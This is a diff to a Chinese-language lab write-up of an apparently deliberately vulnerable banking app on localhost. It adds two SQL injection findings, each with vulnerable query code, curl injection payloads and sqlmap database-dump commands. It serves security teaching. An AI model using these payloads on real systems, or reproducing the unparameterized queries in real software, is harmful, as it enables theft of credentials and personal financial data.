@@ -188,6 +188,112 @@ curl -X POST "http://localhost:5000/api/transfer" \
   }'
 ```
 
+---
+
+### 漏洞8：SQL注入 —— 用户搜索接口（字符串型）
+
+**漏洞位置**：`GET /api/user/search`（`app.py` 第255行，`api_user_search` 函数）
+
+**漏洞描述**：`keyword` 参数通过字符串格式化直接拼入 SQL 的 `LIKE` 子句，未使用参数化查询，攻击者可通过闭合引号注入任意 SQL 语句。
+
+**触发条件**：登录后携带 Session Cookie 访问该接口，传入恶意 `keyword` 参数。
+
+**漏洞代码片段**（`app.py`）：
+```python
+raw_sql = f"""
+    SELECT id, username, real_name, phone
+    FROM users
+    WHERE username LIKE '%{keyword}%'
+       OR real_name LIKE '%{keyword}%'
+    ORDER BY id DESC LIMIT 20
+"""
+result = db.session.execute(text(raw_sql))
+```
+
+**手工验证**：
+```bash
+# 正常请求
+curl -b "session=<你的Cookie>" "http://localhost:5000/api/user/search?keyword=zhang"
+
+# 注入验证（万能条件，返回所有用户）
+curl -b "session=<你的Cookie>" \
+  "http://localhost:5000/api/user/search?keyword=%' OR '1'='1"
+
+# 联合查询注入（获取密码哈希）
+curl -b "session=<你的Cookie>" \
+  "http://localhost:5000/api/user/search?keyword=%' UNION SELECT id,username,password_hash,phone FROM users-- "
+```
+
+**sqlmap 扫描命令**：
+```bash
+# 先登录获取 Cookie，再使用 sqlmap 扫描
+sqlmap -u "http://localhost:5000/api/user/search?keyword=test" \
+  --cookie="session=<登录后的Session Cookie>" \
+  --dbms=sqlite \
+  --level=3 --risk=2 \
+  --technique=U \
+  --dump
+```
+
+---
+
+### 漏洞9：SQL注入 —— 交易记录查询接口（数字型，最易利用）
+
+**漏洞位置**：`GET /api/transactions`（`app.py`，`api_get_transactions` 函数）
+
+**漏洞描述**：`account_id` 参数为数字型，直接拼接进 SQL，**无引号包裹，无需任何绕过**，是最经典、最容易被 sqlmap 自动检测的注入类型。且接口将数据库报错信息原样返回，支持报错注入。
+
+**触发条件**：登录后携带 Session Cookie 访问 `/api/transactions?account_id=<注入载荷>`。
+
+**漏洞代码片段**（`app.py`）：
+```python
+# account_id 直接拼入 SQL，无引号，无过滤
+raw_sql = (
+    f"SELECT id, trans_type, amount, balance_after, description, created_at "
+    f"FROM transactions WHERE account_id = {account_id} "
+    f"ORDER BY created_at DESC LIMIT 20"
+)
+result = db.session.execute(text(raw_sql))
+```
+
+**手工验证**：
+```bash
+# 正常请求（返回账户1的交易记录）
+curl -b "session=<你的Cookie>" "http://localhost:5000/api/transactions?account_id=1"
+
+# 布尔盲注验证（两条结果不同则存在注入）
+curl -b "session=<你的Cookie>" "http://localhost:5000/api/transactions?account_id=1 AND 1=1"
+curl -b "session=<你的Cookie>" "http://localhost:5000/api/transactions?account_id=1 AND 1=2"
+
+# UNION联合查询（获取所有用户名和密码哈希）
+curl -b "session=<你的Cookie>" \
+  "http://localhost:5000/api/transactions?account_id=0 UNION SELECT id,username,password_hash,email,phone,created_at FROM users--"
+```
+
+**sqlmap 一键扫描**：
+```bash
+# 步骤1：登录系统，从浏览器开发者工具或 curl 响应头中获取 Session Cookie
+
+# 步骤2：使用 sqlmap 扫描（数字型注入，level=1 即可检出）
+sqlmap -u "http://localhost:5000/api/transactions?account_id=1" \
+  --cookie="session=<登录后的Session Cookie>" \
+  --dbms=sqlite \
+  --dump
+
+# 步骤3：一键拖库（获取所有表数据）
+sqlmap -u "http://localhost:5000/api/transactions?account_id=1" \
+  --cookie="session=<登录后的Session Cookie>" \
+  --dbms=sqlite \
+  --dump-all \
+  --batch
+```
+
+**可获取的敏感数据**：
+- 所有用户的用户名、密码哈希值
+- 完整银行卡号、持卡人姓名
+- 账户余额、全量交易记录
+- 用户身份证号、手机号、住址
+
 ## 漏洞修复方案
 
 ### 错误代码示例
